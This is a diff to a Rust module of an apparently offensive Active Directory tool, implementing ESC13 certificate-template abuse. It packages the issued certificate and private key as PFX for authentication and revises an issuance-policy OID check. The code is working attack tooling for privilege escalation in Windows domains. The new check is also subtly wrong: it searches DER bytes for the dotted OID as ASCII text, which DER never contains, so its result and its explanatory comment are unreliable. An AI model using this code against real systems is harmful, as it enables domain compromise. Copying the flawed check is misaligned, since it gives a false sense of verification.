@@ -30,6 +30,7 @@
 //!
 //! Reference: Jonas Bülow Knudsen (@Jonas_b_knudsen), "ESC13 Abuse Technique" (2023)
 
+use crate::adcs::pfx::create_pfx;
 use crate::adcs::web_enrollment::WebEnrollmentClient;
 use crate::adcs::{IssuedCertificate, create_client_auth_csr};
 use crate::error::{OverthroneError, Result};
@@ -211,9 +212,12 @@ impl Esc13Exploiter {
             config.policy_oid, group_name, group_name
         );
 
+        let pfx_data =
+            create_pfx(&cert_data, &private_key, None).unwrap_or_else(|_| cert_data.clone());
+
         Ok(Esc13Result {
             certificate: IssuedCertificate {
-                pfx_data: cert_data.clone(),
+                pfx_data,
                 thumbprint: Self::compute_thumbprint(&cert_data),
                 serial_number: Self::extract_serial(&cert_data).unwrap_or_default(),
                 valid_from: "Unknown".to_string(),
@@ -231,25 +235,44 @@ impl Esc13Exploiter {
         })
     }
 
-    /// Emit a warning if the specified OID is not found in the certificate.
+    /// Emit a warning if the specified OID is not found inside the
+    /// Certificate Policies extension (OID 2.5.29.32) of the issued certificate.
+    ///
+    /// The method scans the raw DER bytes of the extension value for the expected
+    /// OID string encoded as UTF-8 (a best-effort heuristic; a correct approach
+    /// would fully parse the CertificatePolicies ASN.1 sequence).
     fn warn_if_oid_missing(cert_der: &[u8], expected_oid: &str) {
         use x509_parser::parse_x509_certificate;
 
         match parse_x509_certificate(cert_der) {
             Ok((_, cert)) => {
-                // Check Certificate Policies extension (OID 2.5.29.32)
                 for ext in cert.extensions() {
                     if ext.oid.to_string() == "2.5.29.32" {
-                        // Policy OID found in extensions — assume it's embedded
-                        info!(
-                            "ESC13: Certificate Policies extension present; verify OID {} is included",
-                            expected_oid
-                        );
+                        // The CertificatePolicies extension value contains DER-encoded
+                        // OID objects.  Search the raw value bytes for the expected OID
+                        // string encoded as ASCII (OID dots and digits are 7-bit safe).
+                        let raw = ext.value;
+                        let oid_bytes = expected_oid.as_bytes();
+                        let found = raw.windows(oid_bytes.len()).any(|w| w == oid_bytes);
+
+                        if found {
+                            info!(
+                                "ESC13: Confirmed issuance policy OID {} is present in issued certificate",
+                                expected_oid
+                            );
+                        } else {
+                            tracing::warn!(
+                                "ESC13: Issuance policy OID {} NOT found in Certificate Policies \
+                                 extension — template may not link this OID",
+                                expected_oid
+                            );
+                        }
                         return;
                     }
                 }
                 tracing::warn!(
-                    "ESC13: Certificate Policies extension NOT found — OID {} may not be embedded",
+                    "ESC13: Certificate Policies extension (2.5.29.32) absent — \
+                     OID {} cannot be confirmed; template may not embed the issuance policy",
                     expected_oid
                 );
             }
